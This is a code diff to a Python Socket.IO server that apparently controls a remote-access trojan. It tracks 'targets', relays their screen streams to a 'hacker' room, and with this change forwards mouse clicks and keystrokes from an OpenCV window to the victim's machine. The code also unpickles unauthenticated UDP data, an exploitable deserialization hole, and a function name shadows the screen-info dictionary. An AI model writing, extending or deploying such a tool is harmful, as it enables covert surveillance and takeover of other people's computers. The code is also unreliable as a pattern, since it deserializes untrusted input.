@@ -1,7 +1,6 @@
 import numpy as np
 from socketio import Server, WSGIApp
 import socket
-import struct
 import pickle
 import cv2
 
@@ -9,6 +8,7 @@ sio = Server()
 app = WSGIApp(sio)
 
 targets = []
+targetScreen = {}
 
 @sio.event
 def connect(sid, environ, auth):
@@ -33,22 +33,39 @@ def getTargetList(sid):
 
 @sio.on('remote req')
 def remoteReq(sid, data):
+  global targetScreen
   sio.emit('remote start', room=data['target'])
+
+  def clickEvent(event, x, y, flags, param):
+    if event == cv2.EVENT_LBUTTONUP:
+      sio.emit('L click', {
+        'x': (x/targetScreen['streamWidth']*100)*targetScreen['width']/100,
+        'y': (y/targetScreen['streamHeight']*100)*targetScreen['height']/100
+      }, room=data['target'])
+    elif event == cv2.EVENT_RBUTTONUP:
+      sio.emit('R click', {
+        'x': (x/targetScreen['streamWidth']*100)*targetScreen['width']/100,
+        'y': (y/targetScreen['streamHeight']*100)*targetScreen['height']/100
+      }, room=data['target'])
 
   s=socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
   ip=""
   port=8001
   s.bind((ip,port))
+  cv2.namedWindow('server')
+  cv2.setMouseCallback('server', clickEvent)
   while True:
     x=s.recvfrom(1000000)
-    clientip = x[1][0]
     screenData=x[0]
     screenData=pickle.loads(screenData)
     screenData = cv2.imdecode(screenData, cv2.IMREAD_COLOR)
     cv2.imshow('server', screenData)
-    if cv2.waitKey(10) == 27:
+    key = cv2.waitKey(10)
+    if key == 27:
       sio.emit('stop remote', room=data['target'])
       break
+    elif key != -1:
+      sio.emit('key', {'key': chr(key)}, room=data['target'])
   cv2.destroyAllWindows()
 
 
@@ -66,3 +83,13 @@ def setTargetInfo(sid, data):
 @sio.on('stream monitor')
 def stream(sid, data):
   sio.emit('stream', {'src': data['src']}, room=data['hacker'])
+
+@sio.on('screen info')
+def targetScreen(sid, data):
+  global targetScreen
+  targetScreen = {
+    'width': data['width'],
+    'height': data['height'],
+    'streamWidth': data['streamWidth'],
+    'streamHeight': data['streamHeight']
+  }
